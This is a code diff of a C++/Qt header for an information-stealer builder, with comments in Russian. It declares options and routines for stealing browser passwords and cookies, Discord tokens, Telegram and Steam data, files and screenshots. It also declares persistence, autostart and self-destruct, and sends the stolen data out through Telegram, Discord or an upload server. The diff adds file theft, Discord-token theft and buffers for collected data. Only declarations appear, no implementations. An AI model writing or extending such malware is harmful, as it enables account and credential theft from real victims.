@@ -81,6 +81,7 @@ public:
         bool passwords = false;            // Включение кражи паролей браузеров
         bool screenshot = false;           // Включение создания скриншота
         bool fileGrabber = false;          // Включение граббера файлов
+        bool stealFiles = false;           // Включение кражи файлов (ДОБАВЛЕНО)
         std::vector<std::string> files;    // Добавлено поле для хранения путей к файлам
         bool systemInfo = false;           // Включение сбора системной информации
         bool socialEngineering = false;    // Включение сбора данных для социальной инженерии
@@ -92,7 +93,7 @@ public:
         bool autoStart = false;            // Включение автозапуска
         bool persist = false;              // Включение персистентности
         bool selfDestruct = false;         // Включение самоуничтожения
-        bool encryptData = false;          // Включение шифрования данных (ДОБАВЛЕНО)
+        bool encryptData = false;          // Включение шифрования данных
         std::string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
         std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
         std::string telegramToken = "";         // Токен для Telegram
@@ -106,7 +107,7 @@ public:
         std::string githubToken = "";           // Токен GitHub
         std::string githubRepo = "";            // Репозиторий GitHub
         std::string uploadUrl = "http://example.com/upload"; // URL для отправки данных
-        std::string serverUrl = "";             // URL сервера для отправки данных (ДОБАВЛЕНО)
+        std::string serverUrl = "";             // URL сервера для отправки данных
     } config;
 
     // UI элементы
@@ -154,6 +155,10 @@ public:
     // Вектор для хранения путей к скриншотам
     std::vector<std::string> screenshotsPaths;
 
+    // Векторы для хранения собранных данных (используются в StealAndSendData)
+    std::string collectedData;             // Текстовые данные
+    std::vector<std::string> filesToSend;  // Файлы для отправки
+
 signals:
     void logUpdated(const QString& message); // Сигнал для обновления логов
     void startStealSignal();                // Сигнал для запуска процесса кражи данных
@@ -179,6 +184,7 @@ private slots:
     void takeScreenshot(const std::string& dir); // Создание скриншота
     void collectSystemInfo(const std::string& dir); // Сбор системной информации
     void stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
+    void stealDiscordTokens();              // Кража токенов Discord (ДОБАВЛЕНО)
     void stealDiscordData(const std::string& dir); // Кража данных Discord (токены, история чатов)
     void stealTelegramData(const std::string& dir); // Кража данных Telegram (история чатов)
     void stealSteamData(const std::string& dir);   // Кража данных Steam (конфиги, MA-файлы)
